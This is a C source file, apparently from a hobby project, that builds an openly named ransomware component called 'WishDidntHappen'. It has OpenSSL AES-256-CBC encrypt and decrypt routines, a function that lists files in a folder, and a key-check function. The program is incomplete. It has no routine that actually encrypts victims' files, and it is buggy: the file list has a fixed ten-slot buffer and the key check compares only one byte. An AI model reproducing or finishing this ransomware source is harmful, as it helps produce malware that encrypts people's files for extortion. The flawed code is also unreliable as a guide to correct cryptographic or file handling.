/*
 *
 * Author: Merih Bora Po√ßan
 * Mail: mborapocan@gmail.com
 * Github: @borapocan <git@borapocan.com>
 * Creation Date: 17-04-2023
 * Last Modified: Sat Apr 22 12:23:58 2023
 *
 */

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include "ransomware.h"

struct Ransomware {
	char *name;
	char *key;
	void (*set_name)(Ransomware*, char*);
	char*(*get_name)(Ransomware*);
	void (*set_key)(Ransomware*, char*);
	char*(*get_key)(Ransomware*);
	//int (*check_key)(char*);
};

void Ransomware__set_name(Ransomware *self, char *ransomware_name) {
	self->name = ransomware_name;
}

char* Ransomware__get_name(Ransomware *self) {
	return self->name;
}

void Ransomware__set_key(Ransomware *self, char *ransomware_key) {
	self->key = ransomware_key;
}

char* Ransomware__get_key(Ransomware *self) {
	return self->key;
}

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    /*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}

char** Ransomware__get_files_in_folder(char *path) {
	DIR *d;
	struct dirent *dir;
	char **files = malloc(10 * sizeof(char*));
	int i = 0;
	d = opendir(path);
	if (d) {
		while ((dir = readdir(d)) != NULL) {
			if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) {
				continue;
			} else {
				files[i] = dir->d_name;
			}
			i++;
		}
		closedir(d);
	}
	return files;
}

Ransomware* Ransomware__init() {
	struct Ransomware *self = malloc(sizeof *self);
	self->set_name = Ransomware__set_name;
	self->set_name(self, "WishDidntHappen");
	self->get_name = Ransomware__get_name;
	self->set_key = Ransomware__set_key;
	self->get_key = Ransomware__get_key;
	//self->name = self->get_name;
	//self->key = keyx;
	return self;
}

//Ransomware* Ransomware__set_name(Ransomware *self, char* (*name_ptr)(char *name_str)) {
//	self->set_name = name_ptr;
//	return self;
//}
//
////char* Ransomware__key(char *key_str) {
////	return  key_str;
////}
//
//Ransomware* Ransomware__key(Ransomware *self, char* (*key_ptr)(char *key_str)) {
//	self->key = key_ptr;
//	return self;
//}
//
int compare_keys(char *private_key, char *target_key)
{
	return (*(char*)private_key == *(char*)target_key);
}
//
//void Ransomware__destroy(Ransomware *);
